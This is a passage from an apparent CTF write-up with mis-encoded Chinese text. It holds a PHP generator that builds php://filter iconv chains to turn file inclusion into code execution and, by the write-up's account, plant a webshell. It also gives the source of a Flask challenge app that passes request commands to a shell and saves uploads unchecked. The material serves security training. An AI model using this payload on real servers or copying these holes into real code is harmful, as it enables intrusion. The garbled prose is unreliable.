single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'c'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'d'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'e'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'f'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'g'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'h'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'i'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'j'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'k'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'l'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'m'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'n'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'o'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'p'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'q'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'r'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'s'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'t'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'u'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'v'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'w'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'x'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'y'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'z'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filters</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"convert.base64-encode|"</span><span class="token punctuation">;</span><span class="token comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.iconv.UTF8.UTF7|"</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token function">str_split</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$base64_payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token variable">$conversions</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span>    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-decode|"</span><span class="token punctuation">;</span>    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-encode|"</span><span class="token punctuation">;</span>    <span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.iconv.UTF8.UTF7|"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$filters</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"convert.base64-decode"</span><span class="token punctuation">;</span><span class="token variable">$final_payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$filters</span><span class="token punctuation">&#125;</span></span>/resource=index.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$final_payload</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>äºæ˜¯ä¼ å…¥å†™é©¬</p><hr><h1 id="è¹¦è¹¦ç‚¸å¼¹ï¼ˆboom-itï¼‰ï¼ˆå¤ç°ï¼‰"><a href="#è¹¦è¹¦ç‚¸å¼¹ï¼ˆboom-itï¼‰ï¼ˆå¤ç°ï¼‰" class="headerlink" title="è¹¦è¹¦ç‚¸å¼¹ï¼ˆboom_itï¼‰ï¼ˆå¤ç°ï¼‰"></a>è¹¦è¹¦ç‚¸å¼¹ï¼ˆboom_itï¼‰ï¼ˆå¤ç°ï¼‰</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> session<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token keyword">import</span> threading<span class="token keyword">import</span> random<span class="token keyword">import</span> string<span class="token keyword">import</span> datetime<span class="token keyword">import</span> rsa<span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>utils <span class="token keyword">import</span> secure_filename<span class="token keyword">import</span> os<span class="token keyword">import</span> subprocess<span class="token punctuation">(</span>pubkey<span class="token punctuation">,</span> privkey<span class="token punctuation">)</span> <span class="token operator">=</span> rsa<span class="token punctuation">.</span>newkeys<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">"super_secret_key"</span>UPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">'templates/uploads'</span>ALLOWED_EXTENSIONS <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'png'</span><span class="token punctuation">,</span> <span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'txt'</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> UPLOAD_FOLDER<span class="token keyword">def</span> <span class="token function">allowed_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'.'</span> <span class="token keyword">in</span> filename <span class="token keyword">and</span> filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> ALLOWED_EXTENSIONS<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token keyword">and</span> password <span class="token operator">==</span> users<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'admin_logged_in'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>            <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'admin_dashboard'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"Invalid credentials"</span><span class="token punctuation">,</span> <span class="token number">401</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin_login.html'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/dashboard'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin_dashboard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'admin_logged_in'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">'file'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>files<span class="token punctuation">:</span>            <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No selected file'</span>        filename <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>filename        <span class="token builtin">file</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">'File uploaded successfully'</span>    cmd_output <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">if</span> <span class="token string">'cmd'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>args<span class="token punctuation">:</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"lock.txt"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># æ£€æŸ¥å½“å‰ç›®å½•ä¸‹æ˜¯å¦å­˜åœ¨lock.txt</span>            cmd <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                cmd_output <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>                cmd_output <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            cmd_output <span class="token operator">=</span> <span class="token string">"lock.txt not found. Command execution not allowed."</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'admin_dashboard.html'</span><span class="token punctuation">,</span> users<span class="token operator">=</span>users<span class="token punctuation">,</span> cmd_output<span class="token operator">=</span>cmd_output<span class="token punctuation">,</span> active_tab<span class="token operator">=</span><span class="token string">"cmdExecute"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin_logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'admin_logged_in'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Generate random users</span><span class="token keyword">def</span> <span class="token function">generate_random_users</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>    users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        users<span class="token punctuation">[</span>username<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">2000</span><span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> usersusers <span class="token operator">=</span> generate_random_users<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>users<span class="token punctuation">[</span><span class="token string">"HRP"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"HRP"</span><span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">6000</span><span class="token punctuation">&#125;</span><span class="token comment"># Add an admin user with a random password</span>admin_password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> admin_password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span>flag_price <span class="token operator">=</span> <span class="token number">10000</span>flag <span class="token operator">=</span> admin_password  <span class="token comment"># The flag is the password of the admin user</span>mutex <span class="token operator">=</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> logged_in<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> username<span class="token operator">=</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> balance<span class="token operator">=</span>users<span class="token punctuation">[</span>session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"balance"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">,</span> logged_in<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/reset'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> users    users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>  <span class="token comment"># Clear all existing users</span>    users <span class="token operator">=</span> generate_random_users<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span>    users<span class="token punctuation">[</span><span class="token string">"HRP"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"HRP"</span><span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">6000</span><span class="token punctuation">&#125;</span>    <span class="token keyword">global</span> admin_password    admin_password<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">global</span> flag    <span class="token comment"># Add an admin user with a random password</span>    admin_password <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>random<span class="token punctuation">.</span>choices<span class="token punctuation">(</span>string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">,</span> k<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    flag<span class="token operator">=</span>admin_password    users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> admin_password<span class="token punctuation">,</span> <span class="token string">"balance"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> username <span class="token keyword">in</span> users <span class="token keyword">and</span> users<span class="token punctuation">[</span>username<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span> <span class="token operator">==</span> password<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> username        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Invalid credentials"</span><span class="token punctuation">,</span> <span class="token number">403</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/logout'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    session<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">log_transfer</span><span class="token punctuation">(</span>sender<span class="token punctuation">,</span> receiver<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">encrypt_data_with_rsa</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># Encrypt the data multiple times</span>            encrypted_data <span class="token operator">=</span> rsa<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span>        <span class="token keyword">return</span> encrypted_data<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    timestamp <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M:%S.%f'</span><span class="token punctuation">)</span>        <span class="token comment"># Encrypt the amount and timestamp</span>    encrypted_amount <span class="token operator">=</span> encrypt_data_with_rsa<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span>    encrypted_timestamp <span class="token operator">=</span> encrypt_data_with_rsa<span class="token punctuation">(</span>timestamp<span class="token punctuation">,</span> pubkey<span class="token punctuation">)</span>        log_data <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>encrypted_timestamp<span class="token punctuation">&#125;</span></span><span class="token string"> - Transfer from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>sender<span class="token punctuation">&#125;</span></span><span class="token string"> to </span><span class="token interpolation"><span class="token punctuation">&#123;</span>receiver<span class="token punctuation">&#125;</span></span><span class="token string"> of encrypted amount </span><span class="token interpolation"><span class="token punctuation">&#123;</span>encrypted_amount<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>         log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Transaction initiated from device: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Mobile'</span><span class="token punctuation">,</span> <span class="token string">'Web'</span><span class="token punctuation">,</span> <span class="token string">'ATM'</span><span class="token punctuation">,</span> <span class="token string">'In-Branch Terminal'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>        log_data <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"Initiator IP address: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'192.168.1.'</span><span class="token punctuation">,</span> <span class="token string">'10.0.0.'</span><span class="token punctuation">,</span> <span class="token string">'172.16.0.'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token 